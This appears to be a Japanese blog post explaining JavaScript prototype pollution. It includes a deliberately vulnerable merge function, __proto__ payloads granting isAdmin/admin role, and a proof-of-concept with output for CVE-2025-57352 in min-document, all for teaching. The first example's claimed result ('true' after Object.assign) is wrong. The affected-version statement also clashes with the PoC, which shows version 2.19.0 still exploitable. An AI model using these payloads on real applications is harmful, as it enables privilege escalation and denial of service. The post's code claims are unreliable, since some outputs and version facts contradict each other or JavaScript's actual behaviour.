---
title: "JavaScriptのPrototype Pollution（プロトタイプ汚染）について"
emoji: "🔗"
type: "idea"
topics: ["prototype", "javascript"]
published: true
published_at: 2025-11-09
---

## プロトタイプ汚染とは

プロトタイプベースの言語であるJavaScriptは、プロトタイプオブジェクトを元にオブジェクトを生成します。
攻撃者は、プロトタイプオブジェクトを改ざんすることにより、アプリケーションのあらゆるオブジェクトを改変させることができます。
結果として、アプリケーションに予期せぬ動作や悪意ある動作を発生させます。

## 基本的な例

```javascript
// 通常のオブジェクト
const user = { name: 'Alice' };
console.log(user.isAdmin); // undefined

// プロトタイプ汚染
const maliciousPayload = JSON.parse('{"__proto__": {"isAdmin": true}}');
Object.assign({}, maliciousPayload);

// 新しいオブジェクトが影響を受ける
const newUser = { name: 'Bob' };
console.log(newUser.isAdmin); // true
```

## 実際の攻撃シナリオ

```javascript
// ⚠️ 脆弱なコード例 - セキュリティ対策なし (Vulnerable code example - No security measures)
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) {
        target[key] = {};
      }
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// 攻撃前
const normalUser = {};
console.log(normalUser.isAdmin); // undefined

// __proto__ を使ってプロトタイプを汚染
const attackPayload = {
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
};

merge({}, attackPayload);

// 攻撃後
const anotherUser = {};
console.log(anotherUser.isAdmin); // true
console.log(anotherUser.role); // "admin"
```

## CVE-2025-57352 の概要

**CVE-2025-57352** は、min-document パッケージに存在するプロトタイプ汚染の脆弱性です。

### 脆弱性の詳細

min-document の `removeAttributeNS` メソッドに不適切なネームスペース操作の処理があり、攻撃者が `__proto__` プロパティを含む悪意のある入力を処理させることで、JavaScriptオブジェクトのプロトタイプチェーンを操作できます。

### 影響を受けるバージョン

- min-document 2.19.0 より前のすべてのバージョン

### 脆弱性の種類

- CWE-1321：プロトタイプ・ポリューション（オブジェクトプロトタイプ属性の不正制御修正）

### 深刻度

- CVSS v3.1 ベーススコア：**5.3（中程度）**
- ベクトル：`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`

### 潜在的な影響

サービス拒否（DoS）または任意コード実行につながる可能性があります。

https://nvd.nist.gov/vuln/detail/CVE-2025-57352

https://github.com/github/advisory-database/pull/6392

https://advisories.gitlab.com/pkg/npm/min-document/CVE-2025-57352/

## CVE-2025-57352 (min-document) の例

https://github.com/OrangeShieldInfos/PoCs/blob/main/JavaScript/prototype-pollution/CVE-2025-57352/index.js

```javascript
const clazz = require("min-document/dom-element");
let instance = new clazz();

console.log({}.toString ? '[toString]':'[DELETE_TRIGGERED]');
instance.removeAttributeNS('__proto__', 'toString');
console.log({}.toString ? '[toString]':'[DELETE_TRIGGERED]');
```

```bash
$ npm i min-document@2.19.0
$ node poc.js
[toString]
[DELETE_TRIGGERED]
```

## 参考資料

- [Raynos/min-document: A minimal DOM implementation](https://github.com/Raynos/min-document)
- [Prototype Pollution in min-document · Issue #54 · Raynos/min-document](https://github.com/Raynos/min-document/issues/54)
- [Fix prototype pollution in removeAttributeNS by jameswassink · Pull Request #55 · Raynos/min-document](https://github.com/Raynos/min-document/pull/55)
